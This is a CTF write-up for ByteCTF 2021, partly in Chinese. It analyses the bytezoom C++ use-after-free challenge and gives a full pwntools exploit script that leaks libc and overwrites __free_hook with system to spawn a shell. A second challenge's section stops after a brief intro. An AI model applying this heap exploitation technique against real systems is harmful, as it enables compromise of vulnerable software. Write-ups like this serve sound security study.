---
name: ByteCTF-2021
challenges:
- name: bytezoom
  tag: cpp | UAF
  solved: true
- name: byteCSMS
  tag: cpp | heapfengshui
  solved: false
---

## bytezoom

> This should be the "signin-challenge" sorted to pwn in bytectf2021(, and also the first challenge I tried in a CTF game).
>
> But I didn't solve it before the game ended.
>
> 现在回过头来看，这道题其实就一个 UAF，难点在于 cpp 中对堆块的申请和释放比较隐蔽，一开始不太好分析。

#### Analysis

首先看漏洞发生在 `manage_select` 的函数中，这里不难看出（实际上也可以根据 if-else 的逻辑 + 调试得到）被 select 的 cat/dog 会被放在同一个名为 `unk_1c280`（实际偏移是 `0x122E0`）的全局变量中，而后面的其他 manage 都用了这个全局变量来做索引，这在 UAF 的同时也__隐含了 cat 和 dog 是有机会混淆的__。

这样来看，UAF 已经基本满足条件，接下来是怎么 free 的问题：程序中确实没有对 free 的显式调用，但不妨试一下申请两个类型、序号都一样的对象，发现旧的那个会被释放进 bin 中。

有了大概思路后再回头看 ida 会轻松很多，进到 create 里面，发现了关于字符串申请、复制相关的操作，又已知：字符串申请的大小是从小到大，发现装不够就翻倍的模式。这就给利用过程中申请不同大小的 chunk 提供了条件。

这时候也可以到 create 函数读完 idx 后面的那句 search 函数中细看一下 free 的逻辑：

```cpp
std::unordered_map<int,Node<int,std::shared_ptr<unk_12340>> *,std::hash<int>,std::equal_to<int>,std::allocator<std::pair<int const,Node<int,std::shared_ptr<unk_12340>> *>>>::erase(v8, v9);
```

关键就在于 unordered_map 在遇到两个相同的对象时，会 free 掉老的那个，这便是上面堆块释放行为的由来。

再看一下 cat 和 dog 结构体中的成员：

```python
    cat                             dog
    -----------------------         -----------------------
    | chunk size: 0x40    |         | chunk size: 0x40    |
    |---------------------|         |---------------------|
    | ptr to heap         |         | ptr to heap         |
    |---------------------|         |---------------------|
    | name_ptr            |         | age                 |
    |---------------------|         |---------------------|
    | name_size           |         | name_ptr            |
    |---------------------|         |---------------------|
    | prepared_for_name   |         | name_size           |
    |---------------------|         |---------------------|
    | prepared_for_name   |         | prepared_for_name   |
    |---------------------|         |---------------------|
    | age                 |         | prepared_for_name   |
    -----------------------         -----------------------
```

#### Exploitation

```python
#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1

filename = "./pwn"
if LOCAL:
    p = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    p = remote(remote_service[0], int(remote_service[1]))
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("p.pid")
        input()
    pass

def cmd(choice):
	ru(b'choice:\n')
	sl(i2b(choice))
def create(cat_dog, idx, age, name=b'a'*8):
	cmd(1)
	ru(b'cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'index:\n')
	sl(i2b(idx))
	ru(b"name:\n")
	sl(name)
	ru(b"age:\n")
	sl(i2b(age))
def show(cat_dog, idx):
	cmd(2)
	ru(b'cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'index:\n')
	sl(i2b(idx))
def manage_select(cat_dog, idx):
	cmd(3)
	cmd(1)
	ru(b'select cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b"index:\n")
	sl(i2b(idx))
	cmd(4)
def manage_add_age(cat_dog, delta):
	cmd(3)
	cmd(2)
	ru(b'select cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'add\n')
	sl(i2b(delta))
	cmd(4)
def manage_name(cat_dog, new_name):
	cmd(3)
	cmd(3)
	ru(b'select cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'name:\n')
	sl(new_name)
	cmd(4)

debugPID()


# -------leak-thorugh-UAF---------
## trying to get a unsortedbin chunk near nameptr
create(1, 0, 8, b"a"*0x420)
manage_select(1, 0)
create(1, 0, 8, b"a"*0x20)
create(0, 0, 8, b"a"*0x20)

manage_add_age(1, 0xc0)
show(0, 0)
ru(b"name:")
libc_base = uu64(rn(6)) - 0x1ecbe0
lg("libc_base")


# -------tcache-attack------------
create(1, 1, 8, b"a"*0x30)
manage_select(1, 1)
create(1, 1, 8, b"b"*0x30)
manage_name(1, p64(libc_base + l.symbols['__free_hook'] - 0x18).replace(b"\x00", b""))
create(1, 2, 8)
create(1, 3, 8, b"/bin/sh\x00".ljust(0x60, b"a"))
create(0, 4, 8, p64(libc_base + l.symbols['system']))
create(1, 3, 8)

irt()
```

## byteCSMS

> 上一题主要考察了 shared_ptr 和 string 的内存结构，这道题考察的则是 vector。
>
> 主要漏洞是堆溢出（通过测试很容易发现）。

#### Analysis


